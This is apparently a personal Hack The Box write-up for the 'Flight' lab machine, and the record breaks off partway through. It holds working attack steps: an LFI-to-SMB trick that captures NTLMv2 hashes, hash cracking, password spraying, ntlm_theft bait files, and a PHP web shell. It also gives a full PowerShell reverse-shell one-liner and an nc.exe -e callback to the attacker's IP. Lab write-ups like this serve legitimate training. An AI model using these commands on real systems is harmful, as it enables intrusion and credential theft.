# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
```bash
nmap -sV -sC -vv 10.10.11.187
nmap -sU --top-ports=10 -vv 10.10.11.187

---OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-24 20:06:02Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=4/24%Time=680A985F%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32072/tcp): CLEAN (Timeout)
|   Check 2 (port 59198/tcp): CLEAN (Timeout)
|   Check 3 (port 44855/udp): CLEAN (Timeout)
|   Check 4 (port 47973/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 5m47s
| smb2-time: 
|   date: 2025-04-24T20:06:26
|_  start_date: N/A

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127
```
----
## SMB & RPCClient Initial Enumeration
- Initial null, guest, anonymous autentication fails
---
## Directory Enumeration
- Gobuster:
- Directory
```bash
gobuster dir -u http://school.flight.htb dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root -x php
---OUTPUT---
/images               (Status: 301) [Size: 347] [--> http://school.flight.htb/images/]
/index.php            (Status: 200) [Size: 3996]
/Images               (Status: 301) [Size: 347] [--> http://school.flight.htb/Images/]
/Index.php            (Status: 200) [Size: 3996]
/examples             (Status: 503) [Size: 406]
/styles               (Status: 301) [Size: 347] [--> http://school.flight.htb/styles/]
/licenses             (Status: 403) [Size: 425]
/IMAGES               (Status: 301) [Size: 347] [--> http://school.flight.htb/IMAGES/]
/%20                  (Status: 403) [Size: 306]
/INDEX.php            (Status: 200) [Size: 3996]
/*checkout*           (Status: 403) [Size: 306]
/*checkout*.php       (Status: 403) [Size: 306]
/phpmyadmin           (Status: 403) [Size: 425]
/webalizer            (Status: 403) [Size: 425]
/Styles               (Status: 301) [Size: 347] [--> http://school.flight.htb/Styles/]

```
- Ffuf
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://flight.htb/ -H 'Host: FUZZ.flight.htb' -fw 1546

---OUTPUT---
school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 110ms]
rasta                   [Status: 200, Size: 582, Words: 45, Lines: 15, Duration: 290ms]
r157                    [Status: 200, Size: 581, Words: 45, Lines: 15, Duration: 282ms]
r147                    [Status: 200, Size: 581, Words: 45, Lines: 15, Duration: 275ms]
r146                    [Status: 200, Size: 581, Words: 45, Lines: 15, Duration: 275ms]
r07                     [Status: 200, Size: 580, Words: 45, Lines: 15, Duration: 270ms]
r199                    [Status: 200, Size: 581, Words: 45, Lines: 15, Duration: 285ms]
quaomenyulechengguanfangwang [Status: 200, Size: 605, Words: 45, Lines: 15, Duration: 265ms]
qunyinghuizaixiantouzhu [Status: 200, Size: 600, Words: 45, Lines: 15, Duration: 268ms]
r135                    [Status: 200, Size: 581, Words: 45, Lines: 15, Duration: 270ms]
quanxunwangbokoupingce  [Status: 200, Size: 599, Words: 45, Lines: 15, Duration: 260ms]
quanqiushidazhimingbocaigongsi [Status: 200, Size: 607, Words: 45, Lines: 15, Duration: 244ms]
quanguoyouboxinaobo     [Status: 200, Size: 596, Words: 45, Lines: 15, Duration: 243ms]
quanxunwang353788       [Status: 200, Size: 594, Words: 45, Lines: 15, Duration: 260ms]
quzhouqipaidian         [Status: 200, Size: 592, Words: 45, Lines: 15, Duration: 268ms]
quanxunwang2013kaijiangriqi [Status: 200, Size: 604, Words: 45, Lines: 15, Duration: 245ms]
qunaliduqiu             [Status: 200, Size: 799, Words: 70, Lines: 16, Duration: 268ms]
quanxunwangsong69691    [Status: 200, Size: 597, Words: 45, Lines: 15, Duration: 265ms]
:: Progress: [100000/100000] :: Job [1/1] :: 295 req/sec :: Duration: [0:04:21] :: Errors: 0 ::

```
-  school leads to a new websit, the others point to the same website

## Website Enumeration
- Both sites are very basic
- can access `http://school.flight.htb/images/` and `http://school.flight.htb/styles/` which is a folder of images and files respectively
- When I try `http://school.flight.htb/index.php?view=../images` I get a response:
- Suspicious Activity. Blocked and will be reported
- **Possible LFI /File Disclusure**
- Difference is LFI will execute php code while file disclosure will give us the code
### LFI Check
- we try to include index.php in the view argument to capture the code (Burpsuite will be good for this)
```bash
http://school.flight.htb/index.php?view=index.php
```
- we view the page source and file the php code of index.php:
```bash
<?php if (!isset($_GET['view']) || $_GET['view'] == "home.html") { ?>
    <div id="tagline">
      <div>
        <h4>Cum Sociis Nat PENATIBUS</h4>
        <p>Aenean leo nunc, fringilla a viverra sit amet, varius quis magna. Nunc vel mollis purus.</p>
      </div>
    </div>
<?php } ?>
  </div>
<?php
ini_set('display_errors', 0);
error_reporting(E_ERROR | E_WARNING | E_PARSE); 
if(isset($_GET['view'])){
$file=$_GET['view'];
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "<h1>Suspicious Activity Blocked!";
    echo "<h3>Incident will be reported</h3>\r\n";
}else{
    echo file_get_contents($_GET['view']);	
}
}else{
    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}
```
- as we can see it checks for `.. , \\ , htaccess, .shtml` It will give the Suspicious Activity response.
- Windows is fine with forward slashes
- We can try to make it reach us via smb
- to check turn on netcat listener and see if we get a response
- url: `http://school.flight.htb/index.php?view=//10.10.14.25/rocknrj/test`
```bash
nc -lvnp 445

--OUTPUT---
listening on [any] 445 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.187] 50035
E�SMBr▒S�����"NT LM 0.12SMB 2.002SMB 2.??? 
```
- We start an smb server or simply use responder to listen to our interface as it will attempt to authenticate anyway:
```bash
sudo responder -i tun0 
--OR--
impacker-smbserver rocknrj 'pwd' -smb2support

---OUTPUT-RESPONDER---
[+] Listening for events...                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:c1633706c33bb68f:58F95C0A999020891375E2A3E64C0387:010100000000000000DFF2513FB5DB013DD0BF305FEDB33B00000000020008005A004D0052004E0001001E00570049004E002D005400310035005100330034003800470050004100560004003400570049004E002D00540031003500510033003400380047005000410056002E005A004D0052004E002E004C004F00430041004C00030014005A004D0052004E002E004C004F00430041004C00050014005A004D0052004E002E004C004F00430041004C000700080000DFF2513FB5DB01060004000200000008003000300000000000000000000000003000009CD2C6730FF4EBA70E7787ED292D7D35738CBC1C681ED2750A8444DCBA702ABD0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320035000000000000000000                                                       
[*] Skipping previously captured hash for flight\svc_apache
[*] Skipping previously captured hash for flight\svc_apache



---OUTPUT-SMBSERVER---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.187,50046)
[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
[*] User G0\svc_apache authenticated successfully
[*] svc_apache::flight:aaaaaaaaaaaaaaaa:7a8055749bd783ee4fd5a65cc93a74fd:010100000000000000a3011761b5db0196d8ef156c50b7040000000001001000650077006100570069007800790064000300100065007700610057006900780079006400020010004f006c004d0068004a004f0059006400040010004f006c004d0068004a004f00590064000700080000a3011761b5db01060004000200000008003000300000000000000000000000003000009cd2c6730ff4eba70e7787ed292d7d35738cbc1c681ed2750a8444dcba702abd0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320035000000000000000000
[*] Closing down connection (10.10.11.187,50046)
[*] Remaining connections []
[*] Incoming connection (10.10.11.187,50047)
[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
[*] User G0\svc_apache authenticated successfully
[*] svc_apache::flight:aaaaaaaaaaaaaaaa:54921e1314dc41b4fbd0add5a9b98208:010100000000000000a3011761b5db01f7c65f9925fa8c030000000001001000650077006100570069007800790064000300100065007700610057006900780079006400020010004f006c004d0068004a004f0059006400040010004f006c004d0068004a004f00590064000700080000a3011761b5db01060004000200000008003000300000000000000000000000003000009cd2c6730ff4eba70e7787ed292d7d35738cbc1c681ed2750a8444dcba702abd0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320035000000000000000000
[*] Closing down connection (10.10.11.187,50047)
[*] Remaining connections []
[*] Incoming connection (10.10.11.187,50048)
[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
[*] User G0\svc_apache authenticated successfully
[*] svc_apache::flight:aaaaaaaaaaaaaaaa:c87000631ddcfc73f5802ba5432b61d3:010100000000000080399a1761b5db01d01bf80cd70300a90000000001001000650077006100570069007800790064000300100065007700610057006900780079006400020010004f006c004d0068004a004f0059006400040010004f006c004d0068004a004f00590064000700080080399a1761b5db01060004000200000008003000300000000000000000000000003000009cd2c6730ff4eba70e7787ed292d7d35738cbc1c681ed2750a8444dcba702abd0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320035000000000000000000
[*] Closing down connection (10.10.11.187,50048)
[*] Remaining connections []


```
- I copy all the hashes and try to crack it with john :
```bash
vi hash # Copy all hashes here, each hash at a new line
john hash --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
S@Ss!K@*t13      (svc_apache)     
S@Ss!K@*t13      (svc_apache)     
S@Ss!K@*t13      (svc_apache)     
S@Ss!K@*t13      (svc_apache)
```
- We check these credentials (winrm doesn't work):
```bash
netexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13'     
netexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --shares

---OUTPUT-1---
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 

---OUTPUT-2---
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [*] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ            
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ
```
- There are 3 non default shares we can read: 
- Users
- Shared
- Web
- Accessing each share I couldn't really find much
- I tried to enumerate users with netexec:
```bash
netexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --users                

---OUTPUT---
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               -Username-                    -Last PW Set-       -BadPW- -Description-                                 
SMB         10.10.11.187    445    G0               Administrator                 2022-09-22 20:17:02 0       Built-in account for administering the computer/domain                                                                                                                                                    
SMB         10.10.11.187    445    G0               Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                                                                                                  
SMB         10.10.11.187    445    G0               krbtgt                        2022-09-22 19:48:01 0       Key Distribution Center Service Account 
SMB         10.10.11.187    445    G0               S.Moon                        2022-09-22 20:08:22 0       Junion Web Developer 
SMB         10.10.11.187    445    G0               R.Cold                        2022-09-22 20:08:22 0       HR Assistant 
SMB         10.10.11.187    445    G0               G.Lors                        2022-09-22 20:08:22 0       Sales manager 
SMB         10.10.11.187    445    G0               L.Kein                        2022-09-22 20:08:22 0       Penetration tester 
SMB         10.10.11.187    445    G0               M.Gold                        2022-09-22 20:08:22 0       Sysadmin 
SMB         10.10.11.187    445    G0               C.Bum                         2022-09-22 20:08:22 0       Senior Web Developer 
SMB         10.10.11.187    445    G0               W.Walker                      2022-09-22 20:08:22 0       Payroll officer 
SMB         10.10.11.187    445    G0               I.Francis                     2022-09-22 20:08:22 0       Nobody knows why he's here 
SMB         10.10.11.187    445    G0               D.Truff                       2022-09-22 20:08:22 0       Project Manager 
SMB         10.10.11.187    445    G0               V.Stevens                     2022-09-22 20:08:22 0       Secretary 
SMB         10.10.11.187    445    G0               svc_apache                    2022-09-22 20:08:23 0       Service Apache web 
SMB         10.10.11.187    445    G0               O.Possum                      2022-09-22 20:08:23 0       Helpdesk 
SMB         10.10.11.187    445    G0               [*] Enumerated 15 local users: flight
```
- copied users to a file and cleaned it (i manually did little cleaning of fixedusers file):
```bash
netexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --users > smbusers
cat smbusers | awk '{print $5}' > fixedusers
# Some manual cleaning: removed first 3 and last line
cat fixedusers

---OUTPUT-FIXED-USERS---
Administrator
Guest
krbtgt
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
```
-----
## LDAPsearch (alternate way of getting users)
- We try ldapsearch with these credentials (also works with svc_apache):
```bash
ldapsearch -H ldap://10.10.11.187 -D 'S.Moon@flight.htb' -w 'S@Ss!K@*t13' -b "DC=flight,DC=htb"
ldapsearch -H ldap://10.10.11.187 -D 'S.Moon@flight.htb' -w 'S@Ss!K@*t13' -b "DC=flight,DC=htb" '(ObjectClass=user)' sAMAccountName | grep "sAMAccountName"
ldapsearch -H ldap://10.10.11.187 -D 'S.Moon@flight.htb' -w 'S@Ss!K@*t13' -b "DC=flight,DC=htb" '(ObjectClass=user)' sAMAccountName | grep -i "pwd"
ldapsearch -H ldap://10.10.11.187 -D 'S.Moon@flight.htb' -w 'S@Ss!K@*t13' -b "DC=flight,DC=htb" '(ObjectClass=user)' sAMAccountName | grep -i "password"
```
- We find one new user in the second command but it's a machine account (GO$)
----
- I check password policy to see if we can brute force:
```bash
netexec smb 10.10.11.187 --pass-pol -u 'svc_apache' -p 'S@Ss!K@*t13'

---OUTPUT-RELEVANT---
Account Lockout Threshold: None
```
- We can brute force
- We try our credentials on all users:
```bash
netexec smb 10.10.11.187 -u fixedusers -p 'S@Ss!K@*t13' --continue-on-success

---OUTPUT-RELEVANT---
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 

```
- We have Read,Write privileges on Shared share folder 
- Maybe we can poison it to grab a new hash.
- **NEW TOOL** : NTLM_Theft : https://github.com/Greenwolf/ntlm_theft
- Can do manually also, check ippsec.rocks
- I use ntlm_theft to create all files :
```bash
pipx install xlsxwriter              
python3 ntlm_theft.py -g all -s 10.10.14.25 -f rocknrj
cd rocknrj
---OUTPUT-python3--
Created: rocknrj/rocknrj.scf (BROWSE TO FOLDER)
Created: rocknrj/rocknrj-(url).url (BROWSE TO FOLDER)
Created: rocknrj/rocknrj-(icon).url (BROWSE TO FOLDER)
Created: rocknrj/rocknrj.lnk (BROWSE TO FOLDER)
Created: rocknrj/rocknrj.rtf (OPEN)
Created: rocknrj/rocknrj-(stylesheet).xml (OPEN)
Created: rocknrj/rocknrj-(fulldocx).xml (OPEN)
Created: rocknrj/rocknrj.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: rocknrj/rocknrj-(includepicture).docx (OPEN)
Created: rocknrj/rocknrj-(remotetemplate).docx (OPEN)
Created: rocknrj/rocknrj-(frameset).docx (OPEN)
Created: rocknrj/rocknrj-(externalcell).xlsx (OPEN)
Created: rocknrj/rocknrj.wax (OPEN)
Created: rocknrj/rocknrj.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: rocknrj/rocknrj.asx (OPEN)
Created: rocknrj/rocknrj.jnlp (OPEN)
Created: rocknrj/rocknrj.application (DOWNLOAD AND OPEN)
Created: rocknrj/rocknrj.pdf (OPEN AND ALLOW)
Created: rocknrj/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: rocknrj/Autorun.inf (BROWSE TO FOLDER)
Created: rocknrj/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```
- I turn on responder and move to the folder and then smbclient back into the share and start putting each one in until one works. When one does, I wait for a bit to see if the responder gets anything. If nothing, I conitnue on and repeat the process till I get a hit (hopefully). I use mput to put all files and without turning off prompt, I click yes for each until one succeeds : **desktop.ini**
```bash
smb: \> mput *

---OUTPUT---
Put file zoom-attack-instructions.txt? y
NT_STATUS_ACCESS_DENIED opening remote file \zoom-attack-instructions.txt
Put file rocknrj.asx? y
NT_STATUS_ACCESS_DENIED opening remote file \rocknrj.asx
Put file rocknrj-(externalcell).xlsx? y
NT_STATUS_ACCESS_DENIED opening remote file \rocknrj-(externalcell).xlsx
Put file desktop.ini? y
putting file desktop.ini as \desktop.ini (0.9 kb/s) (average 0.9 kb/s)
....
....
```
- We grab a hash on the responder:
```bash
sudo respoder -I tun0

---OUTPUT---
[+] Listening for events...                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:d828250374a45325:B193C2335A20ECE875B5C8E58DABB43B:0101000000000000803DB1214BB5DB01C57C9E37B2C864050000000002000800570056004400480001001E00570049004E002D004A00570031003200570050004E00360046003600510004003400570049004E002D004A00570031003200570050004E0036004600360051002E0057005600440048002E004C004F00430041004C000300140057005600440048002E004C004F00430041004C000500140057005600440048002E004C004F00430041004C0007000800803DB1214BB5DB01060004000200000008003000300000000000000000000000003000009CD2C6730FF4EBA70E7787ED292D7D35738CBC1C681ED2750A8444DCBA702ABD0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320035000000000000000000     
```
- We crack the hash with john:
```bash
vi cbum.hash # copy hash here
john cbum.hash --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
Tikkycoll_431012284 (c.bum)
```
- We can grab the user file in C.Bum's desktop from the Users share.
## Initial Foothold on System
- We check credentials on the shares:
```bash
netexec smb 10.10.11.187 -u 'C.Bum' -p 'Tikkycoll_431012284' --shares

---OUTPUT---
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\C.Bum:Tikkycoll_431012284 
SMB         10.10.11.187    445    G0               [*] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ,WRITE 
```
- We have Read/Write privileges on Web.
- We can upload a php reverse shell here.
- We can do it in many ways, I will list two:
- TcpReverseShell one liner by nishaang
- I create shell.php amd send it to flag.htb;
```php
<?php
system($_REQUEST['rocknrj']);
?>
```
- I copied the one liner from the Invoke-PowershellTcpOneLine.ps1 file with my ip and port and added it to burp, url encoded it and sent:
```bash
# Main code
powershell "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.25',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
--------------------------------------------------------------------------------
#url encoded in burpsuite:
GET /shell.php/?rocknrj=powershell+"$client+%3d+New-Object+System.Net.Sockets.TCPClient('10.10.14.25',9999)%3b$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2++%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()"
```
- I have netcat listening on my port (9999) and send the packet.
- I get a reverse shell as svc_apache
- nc.exe : I send nc.exe also to the flag.htb web location andthen pass this command in the url while having netcat listening on the port (9998 for me)
```bash
nc.exe -e powershell.exe 10.10.14.25 9998

# Full url
http://flight.htb/shell.php/?rocknrj=nc.exe%20-e%20powershell.exe%2010.10.14.25%209998
```
- For both I have netcat listening on the relevant port:
```bash
sudo nc -lvnp 9999
sudo nc -lvnp 9998
```
- I get the reverse shell.
- But we are svc_apache user.
- On checking running processes we see there are some our nmap didn't catch (8000,9389...)
```bash
netstat -ano | findstr LISTENING
---OUTPUT---
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5556
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       908
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5556
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       908
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       3080
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       492
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1224
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1656
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:49687          0.0.0.0:0              LISTENING       816
  TCP    0.0.0.0:49695          0.0.0.0:0              LISTENING       3088
  TCP    0.0.0.0:49708          0.0.0.0:0              LISTENING       632
  TCP    10.10.11.187:53        0.0.0.0:0              LISTENING       816
  TCP    10.10.11.187:139       0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       816
  TCP    [::]:80                [::]:0                 LISTENING       5556
  TCP    [::]:88                [::]:0                 LISTENING       640
  TCP    [::]:135               [::]:0                 LISTENING       908
  TCP    [::]:389               [::]:0                 LISTENING       640
  TCP    [::]:443               [::]:0                 LISTENING       5556
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       640
  TCP    [::]:593               [::]:0                 LISTENING       908
  TCP    [::]:636               [::]:0                 LISTENING       640
  TCP    [::]:3268              [::]:0                 LISTENING       640
  TCP    [::]:3269              [::]:0                 LISTENING       640
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8000              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       3080
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       492
  TCP    [::]:49665             [::]:0                 LISTENING       1224
  TCP    [::]:49666             [::]:0                 LISTENING       1656
  TCP    [::]:49667             [::]:0                 LISTENING       640
  TCP    [::]:49673             [::]:0                 LISTENING       640
  TCP    [::]:49674             [::]:0                 LISTENING       640
  TCP    [::]:49687             [::]:0                 LISTENING       816
  TCP    [::]:49695             [::]:0                 LISTENING       3088
  TCP    [::]:49708             [::]:0                 LISTENING       632
  TCP    [::1]:53               [::]:0                 LISTENING       816
  TCP    [dead:beef::8840:1a78:f00e:9ff9]:53  [::]:0                 LISTENING       816
  TCP    [fe80::8840:1a78:f00e:9ff9%6]:53  [::]:0                 LISTENING       816
```
- This shows there's probably something running on this machine in localhost 
- but we can't reach it from our target (maybe due to firewall) (can try with ping)
```bash
nc -zv 10.10.11.187 9389

---OUTPUT---
flight.htb [10.10.11.187] 9389 (?) open
------------------------------------------
nc -zv 10.10.11.187 8000

---OUTPUT---
<Nothing>
```
- I also test for 47k+ ports and its similar to 8000, so why do we choose 8000?
- cause 8000 is more liely a web service wheres ports at 47k are high ephemeral ports usually used for SMB, rpc etc dynamic outbound connections
- On enumerating we see inetpub showing that there is IIS
- Looking at the folders I check with icacls who owns them
```bash
icacls development

---OUTPUT---
icacls development
development flight\C.Bum:(OI)(CI)(W)
            NT SERVICE\TrustedInstaller:(I)(F)
            NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
            NT AUTHORITY\SYSTEM:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
            BUILTIN\Administrators:(I)(F)
            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
            BUILTIN\Users:(I)(RX)
            BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```
- We see C.Bum owns development and we have C.Bum's creds.
## Lateral Movement with Known Credentials
- Using RunasCs.exe (https://github.com/antonioCoco/RunasCs/releases/tag/v1.5) we can jump to another user.
- runas in system doesnt allow us to input pwd and requires tty
- we upload RunasCs.exe (have python server running on directory with RunasCs.exe)
```bash
curl "http://10.10.14.25:8001/RunasCs.exe" -o "RunasCs.exe"
```
- We listen on netcat on the relevant port and pass the command in the target:
```bash
.\RunasCs.exe C.Bum Tikkycoll_431012284 powershell.exe -r 10.10.14.25:9999

---OUTPUT----
[*] Warning: The logon for user 'C.Bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-6fbfe$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6860 created in background.

```
- We get a reverse shell as C.Bum
## Lateral Movement Reverse Shell
- Since this is IIS the reverse shell we need is ASPx
- https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
- copy to file, put our ip and port and send to target
- Now we need to curl to this aspx file...but we don't know domain name and localhost doesn't work (when we try to ping localhost:8000)
